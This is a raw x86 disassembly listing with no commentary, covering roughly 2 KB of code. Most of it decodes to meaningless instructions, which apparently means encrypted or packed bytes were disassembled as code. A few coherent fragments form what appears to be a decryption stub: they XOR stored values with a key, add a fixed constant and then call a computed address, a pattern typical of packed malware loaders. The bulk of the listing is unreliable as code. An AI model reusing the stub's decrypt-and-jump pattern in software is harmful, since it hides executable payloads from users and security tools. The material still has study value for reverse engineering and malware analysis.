  40c569:	ins    DWORD PTR es:[edi],dx
  40c56a:	xor    al,0x38
  40c56c:	rol    DWORD PTR ds:0x10ace6bd,cl
  40c572:	clc    
  40c573:	cli    
  40c574:	cmp    eax,0x9fbe3dd9
  40c579:	or     eax,0xcea6f09b
  40c57e:	arpl   WORD PTR [edi+edx*4+0x4dab0a5e],dx
  40c585:	inc    esi
  40c586:	xchg   esp,eax
  40c587:	and    bl,0x4c
  40c58a:	inc    ebx
  40c58b:	or     bl,BYTE PTR [ebx+ebp*1+0x14]
  40c58f:	mov    ebp,0x747ef53b
  40c594:	xor    BYTE PTR [edi],0x93
  40c597:	cmc    
  40c598:	pop    ecx
  40c599:	inc    ebx
  40c59a:	ret    0x9ea0
  40c59d:	ret    
  40c59e:	mov    esp,0x294a1087
  40c5a3:	test   al,0xf2
  40c5a5:	(bad)  
  40c5a6:	cmp    edi,DWORD PTR [ecx+ecx*1]
  40c5a9:	mov    al,BYTE PTR [edi-0x2b6a7897]
  40c5af:	dec    eax
  40c5b0:	jbe    0x40c5f7
  40c5b2:	iret   
  40c5b3:	(bad)  [esi+ecx*8+0x5d046849]
  40c5ba:	jb     0x40c583
  40c5bc:	add    eax,0x32508767
  40c5c1:	jl     0x40c55f
  40c5c3:	adc    eax,0x3837839e
  40c5c8:	cmc    
  40c5c9:	or     eax,0xaa17dca1
  40c5ce:	cmp    DWORD PTR [edi-0x6d38c1f5],edi
  40c5d4:	xor    esp,DWORD PTR [edi+0x5f]
  40c5d7:	dec    edi
  40c5d8:	pop    ebx
  40c5d9:	sub    eax,0x73b17e84
  40c5de:	ins    DWORD PTR es:[edi],dx
  40c5df:	pop    ebx
  40c5e0:	jnp    0x40c657
  40c5e2:	push   ebx
  40c5e3:	or     esp,DWORD PTR [ebx]
  40c5e5:	call   0x822860fc
  40c5ea:	loopne 0x40c590
  40c5ec:	(bad)  
  40c5ed:	in     eax,dx
  40c5ee:	aam    0x2d
  40c5f0:	xchg   edx,eax
  40c5f1:	pop    ds
  40c5f2:	push   ebx
  40c5f3:	fistp  DWORD PTR [ecx]
  40c5f5:	mov    al,ds:0x337f3ab1
  40c5fb:	and    ah,BYTE PTR [ecx-0x2fd4585c]
  40c601:	mov    cl,ch
  40c603:	inc    edx
  40c604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c605:	cwde   
  40c606:	mov    esi,0x2b13cbbe
  40c60b:	pop    edi
  40c60c:	xchg   ecx,eax
  40c60d:	div    BYTE PTR [ecx]
  40c60f:	std    
  40c610:	pop    ebp
  40c611:	repnz or al,0x93
  40c614:	mov    gs,WORD PTR ss:[eax-0x68]
  40c618:	xchg   edx,eax
  40c619:	sbb    DWORD PTR [edx+0x4913d39c],esp
  40c61f:	xchg   esi,eax
  40c620:	dec    esi
  40c621:	mov    ch,BYTE PTR [eax+0x725b5c4d]
  40c627:	out    dx,eax
  40c628:	mov    ds:0x7808c6ac,al
  40c62d:	mov    ds:0x73f9774b,eax
  40c632:	ret    
  40c633:	pusha  
  40c634:	fld    TBYTE PTR [edi+0x5]
  40c637:	mov    ah,0x71
  40c639:	adc    edi,esp
  40c63b:	cmp    esp,DWORD PTR [edx-0x54]
  40c63e:	xchg   ebx,eax
  40c63f:	sar    bh,1
  40c641:	ret    0x3274
  40c644:	mov    eax,DWORD PTR [eax+eiz*2]
  40c647:	mov    al,BYTE PTR [edi]
  40c649:	test   eax,0x4c50e1d1
  40c64e:	fisubr WORD PTR [ebx+0x694fa488]
  40c654:	iret   
  40c655:	push   cs
  40c656:	jb     0x40c61f
  40c658:	dec    BYTE PTR [eax-0x617b222d]
  40c65e:	aad    0xee
  40c660:	aam    0xfd
  40c662:	jecxz  0x40c6d0
  40c664:	int    0xfb
  40c666:	call   0x5786:0x351dfacf
  40c66d:	call   0x587e8713
  40c672:	(bad)  
  40c673:	fldcw  WORD PTR [ebp+0x3abf186b]
  40c679:	dec    eax
  40c67a:	pop    ds
  40c67b:	inc    DWORD PTR [ecx]
  40c67d:	pop    ecx
  40c67e:	dec    ebp
  40c67f:	push   edi
  40c680:	call   0x7095:0x9215b357
  40c687:	test   eax,0xb37a005f
  40c68c:	mov    dl,0xc2
  40c68e:	jmp    0x6997:0xe11dc164
  40c695:	xor    BYTE PTR [edi],cl
  40c697:	push   eax
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x56d7653f],dl
  40c6de:	rcr    DWORD PTR [eax+0x7e7e80de],1
  40c6e4:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c6e8:	push   edx
  40c6e9:	retf   0xef54
  40c6ec:	push   ebx
  40c6ed:	xchg   BYTE PTR [ebp+0x53],cl
  40c6f0:	sahf   
  40c6f1:	and    ah,BYTE PTR [edi-0x2734595a]
  40c6f7:	adc    DWORD PTR [eax-0x105139bc],ebp
  40c6fd:	xor    DWORD PTR [eax+ecx*1-0x3b],eax
  40c701:	pusha  
  40c702:	xchg   esi,eax
  40c703:	fnstcw WORD PTR [edx]
  40c705:	dec    edi
  40c706:	aad    0xdf
  40c708:	mov    DWORD PTR [ecx],0xf7cb81e4
  40c70e:	cwde   
  40c70f:	icebp  
  40c710:	push   0xb19bc532
  40c715:	and    dh,ah
  40c717:	cmp    ah,ah
  40c719:	ror    BYTE PTR [edi-0x26ed6774],1
  40c71f:	add    BYTE PTR [edi+0x78437044],ah
  40c725:	sbb    eax,0x693a2338
  40c72a:	cmp    dh,BYTE PTR [ecx]
  40c72c:	add    eax,0x8a341bbd
  40c731:	mov    al,0x18
  40c733:	pop    edx
  40c734:	adc    eax,0x37576961
  40c739:	dec    ebp
  40c73a:	fisttp DWORD PTR [edx+0x6ee3d59a]
  40c740:	mov    al,0x43
  40c742:	cld    
  40c743:	add    eax,0x859abfbd
  40c748:	std    
  40c749:	or     BYTE PTR [eax-0x459c0e85],ch
  40c74f:	mov    ebp,0x5a98d969
  40c754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c755:	xchg   edi,eax
  40c756:	lds    esi,FWORD PTR [edx+0x60522ee3]
  40c75c:	mov    eax,0xfa50d01f
  40c761:	xchg   edi,eax
  40c762:	dec    esi
  40c763:	mov    bl,0x36
  40c765:	jecxz  0x40c7cd
  40c767:	mov    ds:0x4cb44a9a,eax
  40c76c:	outs   dx,BYTE PTR ds:[esi]
  40c76d:	add    dh,bl
  40c76f:	clc    
  40c770:	adc    eax,0xe84e3e6c
  40c775:	les    ebp,FWORD PTR [ebp-0x42108482]
  40c77b:	iret   
  40c77c:	jnp    0x40c78d
  40c77e:	test   DWORD PTR [eax],esp
  40c780:	xchg   ebx,eax
  40c781:	adc    al,BYTE PTR [eax+0x21c49938]
  40c787:	pusha  
  40c788:	xor    esp,ebx
  40c78a:	and    al,0xa8
  40c78c:	push   edi
  40c78d:	outs   dx,BYTE PTR ds:[esi]
  40c78e:	shl    BYTE PTR [edx],1
  40c790:	addr16 cdq 
  40c792:	sub    al,0xf3
  40c794:	xchg   BYTE PTR [edi+0x29],dh
  40c797:	cmp    DWORD PTR [edx-0x2a],edx
  40c79a:	cmc    
  40c79b:	rol    BYTE PTR cs:[eax+eax*2],cl
  40c79f:	scas   al,BYTE PTR es:[edi]
  40c7a0:	inc    ebx
  40c7a1:	add    esi,DWORD PTR [esi]
  40c7a3:	out    dx,eax
  40c7a4:	(bad)  
  40c7a5:	stc    
  40c7a6:	fild   DWORD PTR [eax+ebx*2-0x6c31125]
  40c7ad:	stos   DWORD PTR es:[edi],eax
  40c7ae:	jg     0x40c7c7
  40c7b0:	icebp  
  40c7b1:	(bad)  
  40c7b2:	test   al,0x8c
  40c7b4:	push   ecx
  40c7b5:	jno    0xc205736f
  40c7bb:	adc    eax,0x19dbb8ef
  40c7c0:	and    al,0x29
  40c7c2:	adc    eax,0x58ab8b84
  40c7c7:	pop    esp
  40c7c8:	in     al,dx
  40c7c9:	push   cs
  40c7ca:	hlt    
  40c7cb:	jl     0x40c835
  40c7cd:	shr    BYTE PTR [ebx],cl
  40c7cf:	push   edx
  40c7d0:	(bad)  
  40c7d1:	out    0x26,al
  40c7d3:	jb     0x40c774
  40c7d5:	int3   
  40c7d6:	ficom  DWORD PTR [ecx-0x6d]
  40c7d9:	clc    
  40c7da:	push   0xffffff8d
  40c7dc:	xor    DWORD PTR [edx-0x7],eax
  40c7df:	sbb    dh,cl
  40c7e1:	loop   0x40c82c
  40c7e3:	sub    DWORD PTR [ecx],ebp
  40c7e5:	mov    cl,0x9d
  40c7e7:	adc    BYTE PTR fs:[edx],dl
  40c7ea:	mov    eax,ds:0x205be3a2
  40c7ef:	jb     0x40c837
  40c7f1:	out    dx,eax
  40c7f2:	jmp    0x4fca4fb5
  40c7f7:	mov    ds:0xe7057001,eax
  40c7fc:	sub    esi,ebx
  40c7fe:	shl    DWORD PTR [edi+esi*2-0x74bd447e],1
  40c805:	loopne 0x40c7f8
  40c807:	xchg   ecx,eax
  40c808:	int3   
  40c809:	xchg   ebp,eax
  40c80a:	jl     0x40c871
  40c80c:	in     al,dx
  40c80d:	add    eax,0xc1c9cec7
  40c812:	stos   DWORD PTR es:[edi],eax
  40c813:	loope  0x40c7f2
  40c815:	stos   DWORD PTR es:[edi],eax
  40c816:	sub    ah,BYTE PTR [esi-0x61]
  40c819:	jmp    0x7150:0x68a80fd8
  40c820:	xchg   BYTE PTR [edx+edx*8],ah
  40c823:	inc    ecx
  40c824:	or     eax,0xad6597e8
  40c829:	pop    ss
  40c82a:	(bad)  
  40c82b:	mov    WORD PTR [edx],es
  40c82d:	or     eax,0xdb348b2f
  40c832:	sub    ah,cl
  40c834:	push   eax
  40c835:	pusha  
  40c836:	ins    DWORD PTR es:[edi],dx
  40c837:	sub    al,0x59
  40c839:	es dec ebp
  40c83b:	push   ecx
  40c83c:	mov    al,ds:0x7d15613a
  40c841:	inc    edx
  40c842:	and    dl,BYTE PTR ds:0x377521f
  40c848:	imul   edi,DWORD PTR [ecx],0xffffffca
  40c84b:	xchg   DWORD PTR [eax-0x10599ba8],ebp
  40c851:	dec    ebx
  40c852:	aas    
  40c853:	push   0x76
  40c855:	ret    0xaa03
  40c858:	enter  0xdea3,0x6b
  40c85c:	cmp    DWORD PTR [edi],0x5c
  40c85f:	repz fstp TBYTE PTR [edx-0x2f3f08f0]
  40c866:	xchg   BYTE PTR ds:0xf3d97cc2,bl
  40c86c:	test   DWORD PTR [eax],esp
  40c86e:	pop    edi
  40c86f:	or     ebx,DWORD PTR [esi-0x38]
  40c872:	in     al,dx
  40c873:	test   DWORD PTR [eax+0x45],ebp
  40c876:	cmp    eax,0x2fb453b3
  40c87b:	dec    esp
  40c87c:	mov    bh,dh
  40c87e:	mov    edi,0x8f33485a
  40c883:	popf   
  40c884:	or     dl,cl
  40c886:	push   ss
  40c887:	inc    ebx
  40c888:	push   0x3d811be
  40c88d:	fld    TBYTE PTR es:[edi]
  40c890:	cmp    eax,0x38ae4f49
  40c895:	aam    0x9c
  40c897:	dec    ecx
  40c898:	fs push cs
  40c89a:	xor    ebx,edx
  40c89c:	pushf  
  40c89d:	nop
  40c89e:	mov    DWORD PTR [ebp-0x6470fbd5],ebp
  40c8a4:	cs cld 
  40c8a6:	rcl    cl,0x4d
  40c8a9:	sub    dl,cl
  40c8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8ac:	(bad)  
  40c8ad:	je     0x40c84f
  40c8af:	div    DWORD PTR [eax]
  40c8b1:	mov    BYTE PTR [ebx],ch
  40c8b3:	jmp    0x40c85a
  40c8b5:	and    eax,0x7da1594d
  40c8ba:	dec    esp
  40c8bb:	dec    esi
  40c8bc:	frstor [ebp+0x564e59e3]
  40c8c2:	mov    al,0x8c
  40c8c4:	arpl   WORD PTR [edx],bp
  40c8c6:	in     al,dx
  40c8c7:	jp     0x40c906
  40c8c9:	cs add al,0x3f
  40c8cc:	or     BYTE PTR ds:0x81f8ea49,ch
  40c8d2:	mov    cs,WORD PTR [edi-0x5af5e434]
  40c8d8:	xor    DWORD PTR [ebx-0x4bbaf70e],ebx
  40c8de:	sub    al,0xec
  40c8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e1:	mov    ah,BYTE PTR [ecx-0x70]
  40c8e4:	vmread DWORD PTR [ecx+0x34],ecx
  40c8e8:	sub    eax,0xd5ab8398
  40c8ed:	je     0x40c928
  40c8ef:	in     al,dx
  40c8f0:	add    ecx,DWORD PTR [edi]
  40c8f2:	mov    ?,edx
  40c8f4:	xchg   edx,eax
  40c8f5:	stos   DWORD PTR es:[edi],eax
  40c8f6:	out    0xb4,al
  40c8f8:	(bad)  
  40c8f9:	xlat   BYTE PTR ds:[ebx]
  40c8fa:	or     edi,DWORD PTR [esi-0x5f]
  40c8fd:	dec    edi
  40c8fe:	mov    BYTE PTR [edi],cl
  40c900:	mov    al,0x54
  40c902:	jle    0x40c8ed
  40c904:	popa   
  40c905:	push   ds
  40c906:	fadd   QWORD PTR [eax-0xd]
  40c909:	adc    eax,0x9e453797
  40c90e:	dec    edx
  40c90f:	ss pop eax
  40c911:	xchg   edx,eax
  40c912:	or     esi,DWORD PTR ds:0x43b88b6c
  40c918:	cmovbe ebp,DWORD PTR [esi-0x76]
  40c91c:	pop    edx
  40c91d:	in     eax,0x7
  40c91f:	xor    BYTE PTR [esi-0x41],ah
  40c922:	push   0x62178abc
  40c927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c928:	push   es
  40c929:	(bad)  
  40c92a:	xchg   esp,eax
  40c92b:	push   0x558b9bc1
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    ecx,ebx
  40c945:	gs aam 0x43
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	sar    DWORD PTR [ecx-0x1e],cl
  40c953:	inc    ebx
  40c954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c955:	sbb    esp,eax
  40c957:	dec    ebp
  40c958:	lock pop ebp
  40c95a:	or     DWORD PTR [edx-0x1ca0d50d],eax
  40c960:	jno    0x40c98f
  40c962:	retw   
  40c964:	pop    ebx
  40c965:	jb     0x40c927
  40c967:	sub    esp,eax
  40c969:	inc    eax
  40c96a:	ds in  al,dx
  40c96c:	and    DWORD PTR [esp+eiz*2-0x77],ebp
  40c970:	in     eax,0xbf
  40c972:	push   ecx
  40c973:	push   cs
  40c974:	lods   al,BYTE PTR ds:[esi]
  40c975:	test   BYTE PTR [ecx-0x5c],bh
  40c978:	mov    BYTE PTR [esi+0x4e5025b2],bh
  40c97e:	cmp    eax,0x7c529742
  40c983:	pop    eax
  40c984:	xor    al,0x20
  40c986:	jo     0x40c9a3
  40c988:	out    0x25,eax
  40c98a:	sub    eax,0x12cfbcb1
  40c98f:	nop
  40c990:	imul   ebx,ebx,0x13b8004f
  40c996:	or     ecx,DWORD PTR [eax-0x63eadb69]
  40c99c:	sbb    eax,0xdab206af
  40c9a1:	arpl   WORD PTR [esi+0x2f],dx
  40c9a4:	inc    edx
  40c9a5:	dec    ebx
  40c9a6:	in     eax,0xb6
  40c9a8:	jecxz  0x40c935
  40c9aa:	mov    eax,ds:0xc781049a
  40c9af:	cmc    
  40c9b0:	dec    esi
  40c9b1:	cmp    bl,ch
  40c9b3:	lahf   
  40c9b4:	mov    esp,0x54375b78
  40c9b9:	dec    esp
  40c9ba:	sub    eax,0xc189c73b
  40c9bf:	push   esi
  40c9c0:	loop   0x40c9ac
  40c9c2:	jp     0x40c9b4
  40c9c4:	aas    
  40c9c5:	scas   eax,DWORD PTR es:[edi]
  40c9c6:	jg     0x40c9a3
  40c9c8:	sbb    ebp,DWORD PTR [ebp-0x49b2ee36]
  40c9ce:	adc    al,0x9a
  40c9d0:	imul   edi,DWORD PTR [eax],0x41
  40c9d3:	jnp    0x40c95e
  40c9d5:	stos   DWORD PTR es:[edi],eax
  40c9d6:	es cmp ebx,ecx
  40c9d9:	pop    edx
  40c9da:	xchg   DWORD PTR [ebp+0x4bf8d06e],ebp
  40c9e0:	pop    ds
  40c9e1:	(bad)  
  40c9e2:	cmc    
  40c9e3:	mov    bl,0x46
  40c9e5:	lahf   
  40c9e6:	or     ch,BYTE PTR [ebx+ebp*4-0x40]
  40c9ea:	adc    DWORD PTR [edi],esi
  40c9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ed:	ins    BYTE PTR es:[edi],dx
  40c9ee:	add    eax,0xd12ef6e0
  40c9f3:	cmc    
  40c9f4:	push   es
  40c9f5:	repnz mov eax,ds:0xf43ca2ed
  40c9fb:	sbb    eax,0xfe6d91ce
  40ca00:	sbb    dh,BYTE PTR [esi-0x2d]
  40ca03:	jle    0x40ca64
  40ca05:	ds jae 0x40c9d1
  40ca08:	(bad)  
  40ca09:	into   
  40ca0a:	or     DWORD PTR [esi],ecx
  40ca0c:	fimul  DWORD PTR [ecx-0x2b]
  40ca0f:	jmp    0xdea6:0x2f48bf02
  40ca16:	scas   al,BYTE PTR es:[edi]
  40ca17:	mov    ah,0x98
  40ca19:	repz daa 
  40ca1b:	sbb    bl,dh
  40ca1d:	mov    bl,0x81
  40ca1f:	push   eax
  40ca20:	ss jb  0x40c9b4
  40ca23:	js     0x40c9ef
  40ca25:	push   0x27
  40ca27:	jmp    0x40c9c1
  40ca29:	dec    eax
  40ca2a:	mov    edx,0x97854e39
  40ca2f:	mov    esi,?
  40ca31:	mov    ds:0xe92049f9,eax
  40ca36:	mov    DWORD PTR [edx-0x510f92d4],eax
  40ca3c:	loopne 0x40ca81
  40ca3e:	fs in  eax,dx
  40ca40:	fld    QWORD PTR [ecx-0x3fc5cc6d]
  40ca46:	push   ebx
  40ca47:	fisub  WORD PTR ds:0x8c4c0dc2
  40ca4d:	cdq    
  40ca4e:	enter  0xebcc,0x15
  40ca52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca53:	jmp    0x40c9ee
  40ca55:	sar    DWORD PTR [ecx-0x3a],0x41
  40ca59:	jg     0x40c9df
  40ca5b:	icebp  
  40ca5c:	sub    cl,BYTE PTR [edx+0x708f07e]
  40ca62:	inc    esp
  40ca63:	test   BYTE PTR [edx-0x72c15fe],0x2f
  40ca6a:	mov    dl,0x2
  40ca6c:	call   0xb0ba:0x9fd77fb
  40ca73:	jmp    0x40ca02
  40ca75:	fisub  DWORD PTR [esi]
  40ca77:	imul   eax,DWORD PTR [eax-0x10573655],0xb0f990cc
  40ca81:	retf   
  40ca82:	mov    edx,0x366a94c7
  40ca87:	shl    DWORD PTR [esi-0x6],cl
  40ca8a:	mov    al,0x52
  40ca8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca8d:	xor    esi,DWORD PTR [esi]
  40ca8f:	fwait
  40ca90:	shl    bh,cl
  40ca92:	int3   
  40ca93:	jg     0x40ca27
  40ca95:	push   edi
  40ca96:	(bad)  
  40ca98:	xchg   esi,eax
  40ca99:	rcl    ah,cl
  40ca9b:	xchg   ebx,eax
  40ca9c:	xor    dh,BYTE PTR [ecx-0x55]
  40ca9f:	repz add edi,DWORD PTR [eax+0x36]
  40caa3:	loopne 0x40cb22
  40caa5:	ror    BYTE PTR [ebp+eiz*1-0x4d],1
  40caa9:	sahf   
  40caaa:	mov    esi,ebp
  40caac:	mov    bx,0x99e8
  40cab0:	jae    0x40cab7
  40cab2:	and    bl,BYTE PTR [ecx]
  40cab4:	jecxz  0x40cb19
  40cab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab7:	sbb    al,0xed
  40cab9:	clc    
  40caba:	outs   dx,BYTE PTR ds:[esi]
  40cabb:	(bad)  
  40cabc:	jmp    0x9bf2a68
  40cac1:	imul   esi,DWORD PTR [ebx+esi*4-0x78db9b6a],0xb816f57e
  40cacc:	cli    
  40cacd:	mov    edx,0xa282cc2c
  40cad2:	sar    BYTE PTR [ecx],0x42
  40cad5:	dec    edi
  40cad6:	pop    ds
  40cad7:	lods   eax,DWORD PTR ds:[esi]
  40cad8:	mov    al,ds:0x823f27ec
  40cadd:	leave  
  40cade:	ins    WORD PTR es:[edi],dx
  40cae0:	dec    esi
  40cae1:	outs   dx,DWORD PTR ds:[esi]
  40cae2:	xor    al,0x21
  40cae4:	mov    al,0x85
  40cae6:	bound  ecx,QWORD PTR [esi-0x596d2a72]
  40caec:	jl     0x40ca73
  40caee:	sub    ebx,DWORD PTR [esi+0x14]
  40caf1:	fs pop ebp
  40caf3:	sbb    ah,dl
  40caf5:	lahf   
  40caf6:	mov    ebp,0x30ca7d3e
  40cafb:	xor    DWORD PTR [ebx+0x5c],esi
  40cafe:	mov    esi,0xe3f1e3a
  40cb03:	dec    eax
  40cb04:	sbb    eax,0xa2f3306f
  40cb09:	or     DWORD PTR [ecx-0x7cb0c486],ebx
  40cb0f:	test   al,0xf1
  40cb11:	mov    edi,0x49ca6f6b
  40cb16:	pop    esp
  40cb17:	test   edx,eax
  40cb19:	fisub  WORD PTR [edi]
  40cb1b:	call   0xd84fea5f
  40cb20:	sbb    eax,0xdfb976ea
  40cb25:	mov    ch,0x4e
  40cb27:	(bad)  
  40cb28:	ficom  WORD PTR [eax+0x3a3ba825]
  40cb2e:	sub    ecx,DWORD PTR [edx]
  40cb30:	int3   
  40cb31:	pop    eax
  40cb32:	and    BYTE PTR [eax+0x31761fa7],al
  40cb38:	cmp    ebx,edi
  40cb3a:	pop    edx
  40cb3b:	ins    BYTE PTR es:[edi],dx
  40cb3c:	lods   eax,DWORD PTR ds:[esi]
  40cb3d:	mov    ds:0x53b72a57,eax
  40cb42:	adc    DWORD PTR [ecx+0x2eaae22],eax
  40cb48:	cmp    BYTE PTR [edx],ah
  40cb4a:	(bad)  
  40cb4b:	jp     0x40caf4
  40cb4d:	and    DWORD PTR [ebp+0x6416228e],esp
  40cb53:	retf   
  40cb54:	rcr    DWORD PTR [ebx+ebx*8+0x70f77d1],0x79
  40cb5c:	(bad)  
  40cb5d:	lods   al,BYTE PTR ds:[esi]
  40cb5e:	int3   
  40cb5f:	ins    BYTE PTR es:[edi],dx
  40cb60:	xchg   BYTE PTR [esi-0x5b],ch
  40cb63:	in     eax,dx
  40cb64:	and    eax,0x839c975c
  40cb69:	je     0x40cbdf
  40cb6b:	xchg   ecx,eax
  40cb6c:	pop    edx
  40cb6d:	jecxz  0x40cb10
  40cb6f:	inc    esp
  40cb70:	jle    0x40cb44
  40cb72:	sub    ecx,DWORD PTR [eax+0x5a09b94]
  40cb78:	js     0x40cb09
  40cb7a:	xor    bh,ch
  40cb7c:	push   edi
  40cb7d:	or     ebx,DWORD PTR [eax]
  40cb7f:	(bad)  
  40cb80:	ins    BYTE PTR es:[edi],dx
  40cb81:	jg     0x40cb8c
  40cb83:	jae    0x40cb42
  40cb85:	leave  
  40cb86:	sub    DWORD PTR [ebx-0x10],esp
  40cb89:	sti    
  40cb8a:	shl    ecx,0xda
  40cb8d:	ins    BYTE PTR es:[edi],dx
  40cb8e:	cwde   
  40cb8f:	mov    edx,0x76249f49
  40cb94:	mov    edi,0xfc60369
  40cb99:	scas   eax,DWORD PTR es:[edi]
  40cb9a:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x57]
  40cbfc:	add    al,0xda
  40cbfe:	adc    eax,0x7e7e8c62
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	xchg   esp,eax
  40cc08:	mov    ah,0xc6
  40cc0a:	or     esp,DWORD PTR [esi+0x221af648]
  40cc10:	aaa    
  40cc11:	dec    ebp
  40cc12:	mov    ?,WORD PTR [ecx]
  40cc14:	xchg   ecx,eax
  40cc15:	sub    ecx,DWORD PTR [eax-0x56]
  40cc18:	imul   edx,DWORD PTR [edx-0x4d],0xffffffb3
  40cc1c:	inc    ecx
  40cc1d:	and    edx,eax
  40cc1f:	int3   
  40cc20:	sahf   
  40cc21:	inc    edi
  40cc22:	popa   
  40cc23:	sahf   
  40cc24:	xor    eax,0x3643f3e9
  40cc29:	xchg   edi,eax
  40cc2a:	sahf   
  40cc2b:	iret   
  40cc2c:	and    ebx,DWORD PTR [edi]
  40cc2e:	shr    BYTE PTR [ecx+ecx*8-0x33dcb167],1
  40cc35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc36:	mov    fs,WORD PTR [ebx+esi*2]
  40cc39:	ja     0x40ccac
  40cc3b:	(bad)  
  40cc3c:	fst    QWORD PTR [edx+0x2625995c]
  40cc42:	iret   
  40cc43:	rcr    DWORD PTR [esi+0x7e8b902e],1
  40cc49:	(bad)
  40cc4c:	jmp    0x57be:0x9f59c053
  40cc53:	repnz sbb BYTE PTR fs:[edi-0x3e],cl
  40cc58:	pop    edx
  40cc59:	mov    ch,0x43
  40cc5b:	mov    eax,ds:0x486328ef
  40cc60:	jmp    0x40cbfb
  40cc62:	enter  0x72e3,0x94
  40cc66:	enter  0xc2cd,0xf9
  40cc6a:	sti    
  40cc6b:	dec    eax
  40cc6c:	sub    eax,0x8bbb0e03
  40cc71:	dec    ebp
  40cc72:	mov    BYTE PTR [edx-0x73b3c67],al
  40cc78:	mov    WORD PTR [edx-0x60ceebe6],gs
  40cc7e:	xor    DWORD PTR [edi],edx
  40cc80:	mov    bh,0x67
  40cc82:	and    bh,ah
  40cc84:	mov    al,ds:0x153d8056
  40cc89:	out    dx,eax
  40cc8a:	and    eax,0xa265077c
  40cc8f:	repnz mov dh,0xc0
  40cc92:	mov    ecx,0x78f6dad2
  40cc97:	retf   0x937d
  40cc9a:	shl    DWORD PTR [edi],1
  40cc9c:	call   0xd090:0x622adb20
  40cca3:	repnz sub al,0x7e
  40cca6:	icebp  
  40cca7:	lahf   
  40cca8:	xor    eax,0xb68c43c
  40ccad:	addr16 icebp 
  40ccaf:	add    BYTE PTR [ebp-0x5f6377f],bh
  40ccb5:	lods   al,BYTE PTR ds:[esi]
  40ccb6:	es push cs
  40ccb8:	ret    0x8230
  40ccbb:	test   BYTE PTR [esi],cl
  40ccbd:	xchg   esi,eax
  40ccbe:	xor    eax,0xc9311407
  40ccc3:	push   ebp
  40ccc4:	jl     0x40cc50
  40ccc6:	popf   
  40ccc7:	(bad)  
  40ccc8:	fisubr WORD PTR ds:0x4b313a41
  40ccce:	js     0x40ccde
  40ccd0:	loope  0x40cc77
  40ccd2:	stc    
  40ccd3:	push   0xfe29e051
  40ccd8:	ins    DWORD PTR es:[edi],dx
  40ccd9:	div    ebx
  40ccdb:	xor    eax,0x9e74de4a
  40cce0:	inc    ebp
  40cce1:	pop    ecx
  40cce2:	inc    ebp
  40cce3:	adc    ch,BYTE PTR [edi-0x54]
  40cce6:	mov    DWORD PTR [ecx+0x211bff2b],esi
  40ccec:	shr    BYTE PTR [ebp-0x1efb7322],cl
  40ccf2:	sbb    al,0x6c
  40ccf4:	aam    0x83
  40ccf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccf7:	aad    0xbb
  40ccf9:	jl     0x40cd0d
  40ccfb:	je     0x40ccb4
  40ccfd:	je     0x40ccaf
  40ccff:	data16 hlt 
  40cd01:	adc    al,0x41
  40cd03:	fisub  DWORD PTR [eax]
  40cd05:	mov    esi,0x5fb4e3c
  40cd0a:	out    dx,eax
  40cd0b:	xor    eax,0x26b9ae6b
